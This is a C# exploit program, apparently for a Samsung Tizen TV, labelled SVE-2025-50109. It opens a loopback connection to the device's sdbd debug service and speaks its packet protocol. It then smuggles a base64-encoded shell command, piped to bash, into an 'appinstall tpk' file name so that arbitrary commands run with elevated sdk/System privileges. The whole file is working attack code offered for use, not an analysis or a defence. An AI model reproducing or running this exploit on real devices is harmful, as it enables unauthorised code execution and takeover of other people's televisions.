using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

// SVE-2025-50109 loopback injector — runs ON the TV via signed dotnet.
// Connects to sdbd at 127.0.0.1:26101 (devIP=127.0.0.1 -> self-authorized host),
// OPENs "shell:0 appinstall tpk <inj>" so the injected command runs as uid=901(sdk)
// with SMACK label System.
internal static class SdbInject
{
    private static byte[] U32(uint v) { return BitConverter.GetBytes(v); }
    private static byte[] Packet(string cmd, uint a0, uint a1, byte[] data)
    {
        uint c = BitConverter.ToUInt32(Encoding.ASCII.GetBytes(cmd), 0);
        uint sum = 0; foreach (var b in data) sum += b;
        using (var ms = new MemoryStream())
        {
            ms.Write(U32(c), 0, 4); ms.Write(U32(a0), 0, 4); ms.Write(U32(a1), 0, 4);
            ms.Write(U32((uint)data.Length), 0, 4); ms.Write(U32(sum), 0, 4);
            ms.Write(U32(c ^ 0xFFFFFFFF), 0, 4); ms.Write(data, 0, data.Length);
            return ms.ToArray();
        }
    }

    private static int Main(string[] args)
    {
        string cmd = args.Length > 0 ? string.Join(" ", args) : "id; cat /proc/self/attr/current";
        string b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(cmd));
        string inj = "new2.tpk`printf${IFS}%s${IFS}" + b64 + "|base64${IFS}-d|bash`.tpk";
        string svc = "shell:0 appinstall tpk " + inj;
        Console.WriteLine("svc len=" + svc.Length);

        var tcp = new TcpClient();
        tcp.ReceiveTimeout = 15000; tcp.SendTimeout = 15000;
        tcp.Connect("127.0.0.1", 26101);
        var ns = tcp.GetStream();
        ns.Write(Packet("CNXN", 0x01000000, 4096, Encoding.ASCII.GetBytes("host::\0")), 0, 32 + 6);
        // read CNXN
        var hdr = new byte[24];
        int n = ReadFull(ns, hdr, 24);
        string c0 = Encoding.ASCII.GetString(hdr, 0, 4);
        int len = BitConverter.ToInt32(hdr, 12);
        var pl = new byte[len]; ReadFull(ns, pl, len);
        Console.WriteLine("reply " + c0 + " banner=" + Encoding.ASCII.GetString(pl).TrimEnd('\0'));
        if (c0 != "CNXN") { Console.WriteLine("no CNXN"); return 1; }

        var svcB = Encoding.ASCII.GetBytes(svc + "\0");
        ns.Write(Packet("OPEN", 1, 0, svcB), 0, 24 + svcB.Length);
        // pump replies for a few seconds
        var sw = Environment.TickCount;
        var rdbuf = new byte[65536];
        while (Environment.TickCount - sw < 8000)
        {
            if (ns.DataAvailable)
            {
                int r = ns.Read(rdbuf, 0, rdbuf.Length);
                for (int i = 0; i + 24 <= r; i++)
                {
                    string rc = Encoding.ASCII.GetString(rdbuf, i, 4);
                    int rl = BitConverter.ToInt32(rdbuf, i + 12);
                    if (i + 24 + rl > r) break;
                    string body = rl > 0 ? Encoding.UTF8.GetString(rdbuf, i + 24, rl) : "";
                    Console.WriteLine("pkt " + rc + " " + body.Trim().Substring(0, Math.Min(150, body.Trim().Length)));
                    if (rc == "WRTE") { var ack = Packet("OKAY", (uint)BitConverter.ToInt32(rdbuf, i + 8), (uint)BitConverter.ToInt32(rdbuf, i + 4), new byte[0]); ns.Write(ack, 0, ack.Length); }
                    i += 23 + rl;
                }
            }
            else Thread.Sleep(100);
        }
        return 0;
    }

    private static int ReadFull(Stream s, byte[] b, int want)
    {
        int got = 0;
        while (got < want) { int r = s.Read(b, got, want - got); if (r <= 0) break; got += r; }
        return got;
    }
}
